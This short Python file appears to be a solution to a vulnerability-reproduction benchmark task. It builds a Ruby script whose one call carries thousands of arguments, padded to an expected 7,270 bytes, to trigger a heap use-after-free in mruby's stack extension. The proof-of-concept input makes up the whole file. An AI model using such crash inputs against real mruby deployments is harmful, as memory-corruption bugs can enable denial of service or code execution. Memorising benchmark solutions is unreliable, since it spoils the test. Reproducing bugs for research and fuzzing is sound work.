import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in mruby triggered when 
        # mrb_stack_extend is called (e.g., during argument pushing) but a 
        # pointer to the stack (regs) is not updated.
        #
        # Ground truth length is 7270 bytes. We construct a payload of this exact 
        # length that calls a method with a very large number of arguments, 
        # forcing multiple stack reallocations.
        
        # Structure: def f(*a);end;f(1, 1, ..., 1)
        prefix = b"def f(*a);end;f("
        suffix = b"1)"
        chunk = b"1,"
        
        target_len = 7270
        base_len = len(prefix) + len(suffix)
        
        # Calculate repetitions of "1,"
        repeats = (target_len - base_len) // len(chunk)
        
        poc = prefix + chunk * repeats + suffix
        
        # Pad with spaces if necessary to hit exact length
        if len(poc) < target_len:
            poc += b" " * (target_len - len(poc))
            
        return poc